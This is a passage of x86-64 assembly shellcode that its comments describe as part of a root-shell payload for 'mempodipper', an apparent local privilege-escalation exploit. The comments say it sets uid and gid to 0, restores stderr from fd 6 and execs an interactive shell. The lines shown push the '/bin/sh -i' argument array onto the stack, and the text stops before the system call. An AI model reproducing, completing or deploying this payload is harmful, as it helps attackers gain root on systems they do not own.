; This shell code sets uid and gid to 0 and execs a shell in interactive mode.
; It also reopens stderr that was previously saved inside fd 6, for use with mempodipper.

; so at this point:
;	rdi is a pointer to '/bin/sh'
;	rcx is a pointer to '-i'
;	rax is null
; since they are all the same size, we'll push them on the stack
; and then it will be an array:
push rax			; push rax to stack
push rcx			; push rcx to stack
push rdi			; push rdi to stack
mov rsi,rsp			; set rsi (arg 2) to top of stack

xor rdx,rdx			; rdx (arg 3) = 0
